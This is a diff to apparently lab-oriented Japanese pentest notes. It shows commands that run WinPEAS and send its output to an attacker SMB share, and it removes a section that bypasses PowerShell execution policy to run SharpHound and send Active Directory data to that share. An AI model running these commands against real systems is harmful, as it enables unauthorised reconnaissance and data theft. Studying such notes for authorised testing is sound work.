@@ -46,7 +46,7 @@ icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
 copy \\172.16.104.206\Transfer\WinPEASx64.exe .
 ```
 ```powershell
-.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
+.\winPEASx64.exe | Tee-Object -FilePath \\172.16.104.206\Transfer\peas_result.txt
 ```
 
 ### 実行結果抽出
@@ -107,18 +107,4 @@ copy \\172.16.104.206\Transfer\WinPEASx64.exe .
 ---
 ---
 
-# AD
-
-## Auto w/ BloodHound
-
-```zsh
-# Attacker(作成済みのSMB共有を使う)
-cp /opt/bloodhound/SharpHound.ps1 share
-```
-```powershell
-# Target
-powershell -ep bypass
-net use \\192.168.49.104\share /user:username pw
-Import-Module \\192.168.49.104\share\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.104\share -ZipFileName 'audit.zip'
-```
+# WinPEAS結果抽出（長文注意）
